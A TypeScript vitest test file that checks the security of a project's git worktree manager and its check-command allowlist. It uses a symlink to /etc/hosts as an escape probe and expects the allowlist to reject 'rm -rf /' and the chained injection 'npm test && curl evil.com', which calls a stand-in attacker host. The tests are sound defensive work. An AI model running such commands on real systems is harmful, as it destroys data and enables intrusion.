import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { parseAndValidateCheckCommand } from '../src/workspace/check-runner.js';
import {
  applyApprovedRevision,
  assertCleanGitRepo,
  captureWorktreeRevision,
  cleanupTaskWorktree,
  createTaskWorktree,
} from '../src/workspace/worktree-manager.js';

function makeCleanRepo(): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'chayxona-ws-'));
  execFileSync('git', ['init', '-b', 'main'], { cwd: dir });
  execFileSync('git', ['config', 'user.email', 'test@chayxona.local'], { cwd: dir });
  execFileSync('git', ['config', 'user.name', 'Test'], { cwd: dir });
  fs.writeFileSync(path.join(dir, 'hello.ts'), 'export const msg = "v1";\n');
  execFileSync('git', ['add', 'hello.ts'], { cwd: dir });
  execFileSync('git', ['commit', '-m', 'init'], { cwd: dir });
  return dir;
}

describe('worktree-manager & check-runner security', () => {
  it('refuses dirty repos, isolates worktree writes, and blocks unsafe symlink escapes', () => {
    const repo = makeCleanRepo();
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chayxona-data-'));
    try {
      // Dirty repo refused
      fs.writeFileSync(path.join(repo, 'dirty.txt'), 'uncommitted');
      expect(() => assertCleanGitRepo(repo)).toThrow(/uncommitted changes/i);
      fs.unlinkSync(path.join(repo, 'dirty.txt'));

      // Clean repo creates isolated worktree
      const handle = createTaskWorktree(dataDir, repo, 'r-1', 'task-1');
      fs.writeFileSync(path.join(handle.worktreePath, 'hello.ts'), 'export const msg = "v2";\n');
      // Original repo remains untouched
      expect(fs.readFileSync(path.join(repo, 'hello.ts'), 'utf8')).toContain('v1');

      // Unsafe symlink escaping worktree is rejected
      fs.symlinkSync('/etc/hosts', path.join(handle.worktreePath, 'escape-link'));
      expect(() => captureWorktreeRevision('task-1', handle)).toThrow(/Unsafe symlink escape/i);
      fs.unlinkSync(path.join(handle.worktreePath, 'escape-link'));

      // Clean revision captures and applies
      const rev = captureWorktreeRevision('task-1', handle);
      expect(rev.diffPatch).toContain('export const msg = "v2"');

      // AC-13: Diverged original HEAD refuses apply and leaves original untouched
      fs.writeFileSync(path.join(repo, 'other.ts'), 'export const y = 2;\n');
      execFileSync('git', ['add', 'other.ts'], { cwd: repo });
      execFileSync('git', ['commit', '-m', 'diverge'], { cwd: repo });
      expect(() => applyApprovedRevision(repo, rev)).toThrow(/HEAD diverged/i);
      expect(fs.readFileSync(path.join(repo, 'hello.ts'), 'utf8')).toContain('v1');

      cleanupTaskWorktree(dataDir, repo, handle);
      expect(fs.existsSync(handle.worktreePath)).toBe(false);
    } finally {
      fs.rmSync(repo, { recursive: true, force: true });
      fs.rmSync(dataDir, { recursive: true, force: true });
    }
  });

  it('enforces explicit allowlist on check commands', () => {
    expect(parseAndValidateCheckCommand('npm test')).toEqual({ command: 'npm', args: ['test'] });
    expect(() => parseAndValidateCheckCommand('rm -rf /')).toThrow(/not in the explicit allowlist/i);
    expect(() => parseAndValidateCheckCommand('npm test && curl evil.com')).toThrow(/not in the explicit allowlist/i);
  });
});
